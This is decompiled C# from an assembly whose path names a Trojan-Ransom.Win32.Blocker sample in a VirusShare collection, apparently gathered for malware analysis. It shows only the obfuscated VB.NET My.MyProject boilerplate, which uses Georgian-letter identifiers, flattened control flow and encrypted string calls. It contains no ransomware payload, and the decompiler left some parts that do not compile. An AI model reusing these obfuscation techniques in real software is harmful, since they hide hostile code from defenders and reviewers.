// Decompiled with JetBrains decompiler
// Type: Final.My.MyProject
// Assembly: Final, Version=3.19.0.1745, Culture=neutral, PublicKeyToken=null
// MVID: 912F5519-7248-44E3-B098-F33E871EBECC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aitk-30127cc094a284d2b7badec68076f9f82c11bf424936b29e96d1d35a5ad4f898.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Final.My
{
  [StandardModule]
  [HideModuleName]
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  internal sealed class MyProject
  {
    private static readonly MyProject.Ⴄ<MyComputer> Ⴄ;
    private static readonly MyProject.Ⴄ<MyApplication> Ⴅ;
    private static readonly MyProject.Ⴄ<User> Ⴈ;
    private static MyProject.Ⴄ<MyProject.Ⴃ> Ⴀ;
    private static readonly MyProject.Ⴄ<MyProject.Ⴗ> Ⴄ;

    static MyProject()
    {
      MyComputer.ႨႨ();
      MyProject.Ⴄ = new MyProject.Ⴄ<MyComputer>();
      MyProject.Ⴅ = new MyProject.Ⴄ<MyApplication>();
      MyProject.Ⴈ = new MyProject.Ⴄ<User>();
      MyProject.Ⴀ = new MyProject.Ⴄ<MyProject.Ⴃ>();
      MyProject.Ⴄ = new MyProject.Ⴄ<MyProject.Ⴗ>();
    }

    [HelpKeyword("My.Computer")]
    internal static MyComputer Ⴍ => MyProject.Ⴄ.Ⴅ();

    [HelpKeyword("My.Application")]
    internal static MyApplication Ⴓ => MyProject.Ⴅ.Ⴅ();

    [HelpKeyword("My.User")]
    internal static User Ⴍ => MyProject.Ⴈ.Ⴅ();

    [HelpKeyword("My.Forms")]
    internal static MyProject.Ⴃ Ⴈ => MyProject.Ⴀ.Ⴅ();

    [HelpKeyword("My.WebServices")]
    internal static MyProject.Ⴗ Ⴗ => MyProject.Ⴄ.Ⴅ();

    [MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    internal sealed class Ⴃ
    {
      public Form1 Ⴀ;
      [ThreadStatic]
      private static Hashtable Ⴀ;

      [SpecialName]
      public Form1 Ⴗ()
      {
        this.Ⴀ = MyProject.Ⴃ.Ⴓ<Form1>(this.Ⴀ);
        return this.Ⴀ;
      }

      private static T Ⴓ<T>(T Ⴍ) where T : Form, new()
      {
label_3:
        int num = (object) Ⴍ == null ? 1 : 6;
        while (true)
        {
          switch (num)
          {
            case 0:
              MyProject.Ⴃ.Ⴀ = new Hashtable();
              num = 4;
              continue;
            case 1:
              num = MyProject.Ⴃ.Ⴀ == null ? 0 : 3;
              continue;
            case 3:
              // ISSUE: type reference
              num = !Ⴃ.Ⴃ.Ⴅ(MyProject.Ⴃ.Ⴀ, (object) Form1.Ⴀ(__typeref (T), 463, 403), 516, 622) ? 4 : 8;
              continue;
            case 4:
              goto label_10;
            case 6:
            case 7:
              if (Ⴍ.IsDisposed)
              {
                num = 1;
                continue;
              }
              goto label_18;
            case 8:
              goto label_8;
            case 9:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (MyProject.Ⴃ.Ⴓ);
              num = 9;
              continue;
          }
        }
label_8:
        throw new InvalidOperationException(Ⴃ.Ⴅ.Ⴄ(MyComputer.Ⴈ(307275510, 4), new string[0], 549, 524));
label_10:
        // ISSUE: type reference
        Ⴃ.Ⴅ.Ⴀ(MyProject.Ⴃ.Ⴀ, (object) Form1.Ⴀ(__typeref (T), 254, 162), (object) null, 437, 461);
        T obj;
        try
        {
          switch (4)
          {
            case 1:
            case 2:
              break;
            default:
              obj = new T();
              break;
          }
        }
        catch (TargetInvocationException ex) when (
        {
          // ISSUE: unable to correctly present filter
          MyComputer.Ⴓ((Exception) ex, 887, 790);
          if (MyApplication.Ⴍ((Exception) ex, 813, 773) != null)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
          throw new InvalidOperationException(Utils.GetResourceString(MyComputer.Ⴈ(307275501, 0), ex.InnerException.Message), ex.InnerException);
        }
        finally
        {
          switch (0)
          {
            case 2:
            default:
              MyProject.Ⴃ.Ⴀ.Remove((object) typeof (T));
              goto case 2;
          }
        }
        return obj;
label_18:
        return Ⴍ;
      }

      private void Ⴐ<T>(ref T Ⴐ) where T : Form
      {
        Ⴐ.Dispose();
        Ⴐ = default (T);
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      public Ⴃ()
      {
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override bool Equals(object Ⴄ) => base.Equals(Ⴃ.Ⴈ.Ⴓ.Ⴈ(Ⴄ, 524, 595));

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override int GetHashCode() => base.GetHashCode();

      [EditorBrowsable(EditorBrowsableState.Never)]
      internal System.Type Ⴃ() => Form1.Ⴀ(__typeref (MyProject.Ⴃ), 520, 596);

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override string ToString() => base.ToString();

      static Ⴃ() => MyComputer.ႨႨ();
    }

    [MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    internal sealed class Ⴗ
    {
      [EditorBrowsable(EditorBrowsableState.Never)]
      public override bool Equals(object Ⴅ) => base.Equals(Ⴃ.Ⴈ.Ⴓ.Ⴈ(Ⴅ, 564, 619));

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override int GetHashCode() => base.GetHashCode();

      [EditorBrowsable(EditorBrowsableState.Never)]
      internal System.Type Ⴀ() => Form1.Ⴀ(__typeref (MyProject.Ⴗ), 115, 47);

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override string ToString() => base.ToString();

      private static T Ⴄ<T>(T Ⴗ) where T : new()
      {
label_3:
        int num = (object) Ⴗ != null ? 6 : 3;
        while (true)
        {
          switch (num)
          {
            case 2:
            case 4:
              goto label_3;
            case 3:
              goto label_4;
            case 6:
              goto label_5;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (MyProject.Ⴗ.Ⴄ);
              num = 4;
              continue;
          }
        }
label_4:
        return new T();
label_5:
        return Ⴗ;
      }

      private void Ⴈ<T>(ref T Ⴗ) => Ⴗ = default (T);

      [EditorBrowsable(EditorBrowsableState.Never)]
      public Ⴗ()
      {
      }

      static Ⴗ() => MyComputer.ႨႨ();
    }

    [ComVisible(false)]
    [EditorBrowsable(EditorBrowsableState.Never)]
    internal sealed class Ⴄ<Ⴅ> where Ⴅ : new()
    {
      [ThreadStatic]
      private static Ⴅ Ⴐ;

      [SpecialName]
      internal Ⴅ Ⴅ()
      {
label_3:
        int num = (object) MyProject.Ⴄ<Ⴅ>.Ⴐ != null ? 0 : 5;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 6:
              goto label_5;
            case 2:
            case 4:
              goto label_3;
            case 5:
              MyProject.Ⴄ<Ⴅ>.Ⴐ = new Ⴅ();
              num = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (MyProject.Ⴄ<>.Ⴅ);
              num = 4;
              continue;
          }
        }
label_5:
        return MyProject.Ⴄ<Ⴅ>.Ⴐ;
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      public Ⴄ()
      {
      }

      static Ⴄ() => MyComputer.ႨႨ();
    }
  }
}
